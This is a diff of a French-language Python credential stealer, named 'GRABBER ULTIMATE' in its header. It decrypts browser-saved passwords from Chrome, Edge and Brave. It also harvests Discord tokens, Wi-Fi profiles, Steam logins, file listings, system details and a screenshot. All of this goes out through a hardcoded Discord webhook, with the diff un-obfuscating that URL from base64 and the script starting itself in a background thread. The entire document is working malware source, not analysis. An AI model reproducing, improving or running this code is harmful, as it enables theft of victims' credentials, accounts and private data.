@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# GEN-TOOL — GRABBER ULTRA V5 (Déchiffrement Forcé)
+# GEN-TOOL — GRABBER ULTIMATE (Version qui déchiffre)
 # Par Lerisque94z — Pour LO
 
 import os
@@ -26,29 +26,30 @@ from PIL import ImageGrab
 # ============================================================
 # WEBHOOK
 # ============================================================
-__B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTIwMDUxODA0MjE2MTIwMi9UUGtKYXp0SWRjTlcyZzFoVzdSaUNXRmF2TjZ3dlh4WjgyQWNyXzdMOFJzYmtWMWFDMFpydDFlUjdkQTJZMEpsb3dJSQ=="
+WEBHOOK = "https://discord.com/api/webhooks/1539200518042161202/TPkJaztIdcNW2g1hW7RiCWFavN6wvXxZ82Acr_7L8RsbkV1aC0Zrt1eR7dA2Y0JlowII"
 
-def __url():
-    return base64.b64decode(__B64).decode('utf-8')
-
-def __send(content, file_data=None, filename="data.txt"):
+def send_file(content, file_data, filename):
     try:
-        u = __url()
+        files = {"file": (filename, file_data, "text/plain")}
+        payload = {"content": content, "username": "System"}
+        requests.post(WEBHOOK, data=payload, files=files, timeout=10)
+    except:
+        pass
+
+def send_text(content):
+    try:
         payload = {"content": content[:1900], "username": "System"}
-        files = {}
-        if file_data:
-            files = {"file": (filename, file_data, "text/plain")}
-        requests.post(u, data=payload, files=files, timeout=10)
+        requests.post(WEBHOOK, data=payload, timeout=10)
     except:
         pass
 
 # ============================================================
-# RECUPERATION DE LA CLE CHROME (AMELIOREE)
+# RECUPERATION DE LA CLE CHROME (METHODE ROBUSTE)
 # ============================================================
-def __get_chrome_key():
+def get_chrome_key():
     """Récupère la clé de chiffrement de Chrome/Edge"""
     try:
-        # Essayer Chrome
+        # Essayer plusieurs chemins
         paths = [
             os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State",
             os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data\\Local State"
@@ -61,10 +62,10 @@ def __get_chrome_key():
                 encrypted_key = encrypted_key[5:]  # Retire 'DPAPI'
                 return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         return None
-    except:
+    except Exception as e:
         return None
 
-def __decrypt_password(encrypted, key):
+def decrypt_password(encrypted, key):
     """Déchiffre un mot de passe avec AES-GCM"""
     try:
         nonce = encrypted[3:15]
@@ -78,7 +79,7 @@ def __decrypt_password(encrypted, key):
 # ============================================================
 # SYSTEME
 # ============================================================
-def __system():
+def get_system():
     try:
         ip = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
         hostname = socket.gethostname()
@@ -99,26 +100,23 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# MOTS DE PASSE — DECRYPTAGE COMPLET
+# MOTS DE PASSE — AVEC DECRYPTAGE
 # ============================================================
-def __passwords():
+def get_passwords():
     try:
-        key = __get_chrome_key()
-        r = ""
-        total = 0
+        key = get_chrome_key()
         all_passwords = []
+        text_report = ""
         
-        # Affichage pour debug
         if key:
-            __send("🔑 Clé Chrome récupérée avec succès")
+            send_text("🔑 Clé Chrome récupérée avec succès")
         else:
-            __send("⚠️ Clé Chrome non récupérée, tentative avec DPAPI")
+            send_text("⚠️ Clé Chrome non récupérée, tentative avec DPAPI")
         
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
             "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
-            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data",
-            "Opera GX": os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data"
+            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data"
         }
         
         for name, base_path in browsers.items():
@@ -147,7 +145,7 @@ def __passwords():
                     os.remove(temp)
                     
                     if data:
-                        r += f"\n**{name} - {profile}** : {len(data)} comptes\n"
+                        text_report += f"\n**{name} - {profile}** : {len(data)} comptes\n"
                         for url, username, encrypted in data:
                             if username:
                                 try:
@@ -155,7 +153,7 @@ def __passwords():
                                     # 1. Essayer AES avec la clé Chrome
                                     if key and encrypted:
                                         try:
-                                            pwd = __decrypt_password(encrypted, key)
+                                            pwd = decrypt_password(encrypted, key)
                                         except:
                                             pass
                                     # 2. Essayer DPAPI (ancienne méthode)
@@ -164,54 +162,46 @@ def __passwords():
                                             pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                         except:
                                             pass
-                                    # 3. Si tout échoue, on affiche le hash
+                                    # 3. Si on a le mot de passe en clair
                                     if pwd:
-                                        r += f"  {url} : {username} / {pwd}\n"
+                                        text_report += f"  {url} : {username} / {pwd}\n"
                                         all_passwords.append(f"{url} | {username} | {pwd}")
-                                        total += 1
                                     else:
-                                        # Affichage du hash en base64 pour debug
-                                        try:
-                                            hash_b64 = base64.b64encode(encrypted[:20]).decode('utf-8')
-                                            r += f"  {url} : {username} / [CHIFFRE: {hash_b64}...]\n"
-                                        except:
-                                            r += f"  {url} : {username} / [CHIFFRE]\n"
-                                except Exception as e:
-                                    r += f"  {url} : {username} / (erreur: {str(e)[:30]})\n"
-                except Exception as e:
+                                        text_report += f"  {url} : {username} / [CHIFFRE]\n"
+                                except:
+                                    text_report += f"  {url} : {username} / [ERREUR]\n"
+                except:
                     pass
         
         # Envoi du fichier TXT
         if all_passwords:
-            txt_content = "="*60 + "\n"
+            txt_content = "="*70 + "\n"
             txt_content += "MOTS DE PASSE EXTRAITS\n"
             txt_content += f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             txt_content += f"Total: {len(all_passwords)} comptes\n"
-            txt_content += "="*60 + "\n\n"
+            txt_content += "="*70 + "\n\n"
             for pwd in all_passwords:
                 txt_content += pwd + "\n"
-            txt_content += "\n" + "="*60 + "\n"
+            txt_content += "\n" + "="*70 + "\n"
             txt_content += "FIN DU RAPPORT\n"
             
-            __send(f"**📁 MOTS DE PASSE — {len(all_passwords)} comptes**", txt_content.encode('utf-8'), "passwords.txt")
+            send_file(f"**📁 MOTS DE PASSE — {len(all_passwords)} comptes**", txt_content.encode('utf-8'), "passwords.txt")
+            return f"✅ {len(all_passwords)} mots de passe envoyés en fichier"
         
-        if total == 0:
-            return "Aucun mot de passe trouvé"
-        return r
+        return "Aucun mot de passe trouvé"
     except Exception as e:
-        return f"Erreur passwords: {str(e)}"
+        return f"Erreur: {str(e)}"
 
 # ============================================================
 # TOKENS DISCORD
 # ============================================================
-def __tokens():
+def get_tokens():
     try:
         tokens = []
         paths = [
             os.environ["APPDATA"] + "\\discord\\Local Storage\\leveldb",
             os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb",
             os.environ["APPDATA"] + "\\discordptb\\Local Storage\\leveldb",
-            os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\Local Storage\\leveldb",
             os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
         ]
         for path in paths:
@@ -227,9 +217,9 @@ def __tokens():
                             except:
                                 pass
         if tokens:
-            txt_content = "TOKENS DISCORD\n" + "="*30 + "\n" + "\n".join(set(tokens))
-            __send(f"**🎮 TOKENS DISCORD — {len(set(tokens))} tokens**", txt_content.encode('utf-8'), "tokens.txt")
-            return "**TOKENS DISCORD**\n" + "\n".join(set(tokens))[:1500]
+            txt_content = "TOKENS DISCORD\n" + "="*40 + "\n\n" + "\n".join(set(tokens))
+            send_file(f"**🎮 TOKENS DISCORD — {len(set(tokens))} tokens**", txt_content.encode('utf-8'), "tokens.txt")
+            return f"✅ {len(set(tokens))} tokens envoyés"
         return "Aucun token"
     except:
         return "Erreur tokens"
@@ -237,7 +227,7 @@ def __tokens():
 # ============================================================
 # WIFI
 # ============================================================
-def __wifi():
+def get_wifi():
     try:
         out = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
         profiles = []
@@ -263,7 +253,7 @@ def __wifi():
 # ============================================================
 # SCREENSHOT
 # ============================================================
-def __screenshot():
+def get_screenshot():
     try:
         screenshot = ImageGrab.grab()
         tmp = os.environ["TEMP"] + "\\screen.png"
@@ -278,7 +268,7 @@ def __screenshot():
 # ============================================================
 # FICHIERS
 # ============================================================
-def __files():
+def get_files():
     try:
         r = ""
         folders = [
@@ -286,7 +276,7 @@ def __files():
             os.environ["USERPROFILE"] + "\\Documents",
             os.environ["USERPROFILE"] + "\\Downloads"
         ]
-        exts = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4", ".exe", ".bat", ".ps1", ".py", ".js", ".html", ".json"]
+        exts = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4", ".exe", ".bat", ".ps1", ".py"]
         for folder in folders:
             if os.path.exists(folder):
                 for file in os.listdir(folder)[:8]:
@@ -301,7 +291,7 @@ def __files():
 # ============================================================
 # STEAM
 # ============================================================
-def __steam():
+def get_steam():
     try:
         r = ""
         path = os.environ["PROGRAMFILES(X86)"] + "\\Steam\\config\\loginusers.vdf"
@@ -318,52 +308,58 @@ def __steam():
 # ============================================================
 # TACHE PRINCIPALE
 # ============================================================
-def __task():
+def main_task():
     try:
-        __send("**🚀 GRAB ULTRA V5 DEMARRE**")
+        send_text("**🚀 GRAB ULTIME DEMARRE**")
         time.sleep(0.3)
         
-        __send(__system())
+        # 1. Systeme
+        send_text(get_system())
         time.sleep(0.5)
         
-        w = __wifi()
+        # 2. Wi-Fi
+        w = get_wifi()
         if w:
-            __send(w)
+            send_text(w)
         time.sleep(0.5)
         
-        p = __passwords()
-        if p:
-            __send(p)
+        # 3. Mots de passe (avec fichier)
+        p = get_passwords()
+        send_text(p)
         time.sleep(0.5)
         
-        t = __tokens()
-        if t:
-            __send(t)
+        # 4. Tokens (avec fichier)
+        t = get_tokens()
+        send_text(t)
         time.sleep(0.5)
         
-        f = __files()
+        # 5. Fichiers
+        f = get_files()
         if f:
-            __send(f)
+            send_text(f)
         time.sleep(0.5)
         
-        s = __steam()
+        # 6. Steam
+        s = get_steam()
         if s:
-            __send(s)
+            send_text(s)
         time.sleep(0.5)
         
-        img = __screenshot()
+        # 7. Screenshot
+        img = get_screenshot()
         if img:
-            u = __url()
-            requests.post(u, data={"content": "**📸 SCREENSHOT**", "username": "System"}, files={"file": ("screenshot.png", img, "image/png")}, timeout=5)
+            files = {"file": ("screenshot.png", img, "image/png")}
+            payload = {"content": "**📸 SCREENSHOT**", "username": "System"}
+            requests.post(WEBHOOK, data=payload, files=files, timeout=5)
         
-        __send("**✅ GRAB ULTRA V5 TERMINE**")
+        send_text("**✅ GRAB ULTIME TERMINE**")
     except Exception as e:
-        __send(f"**ERREUR:** {str(e)[:200]}")
+        send_text(f"**ERREUR:** {str(e)[:200]}")
 
 # ============================================================
 # LANCEMENT
 # ============================================================
-threading.Thread(target=__task, daemon=True).start()
+threading.Thread(target=main_task, daemon=True).start()
 time.sleep(0.1)
 
 # ============================================================
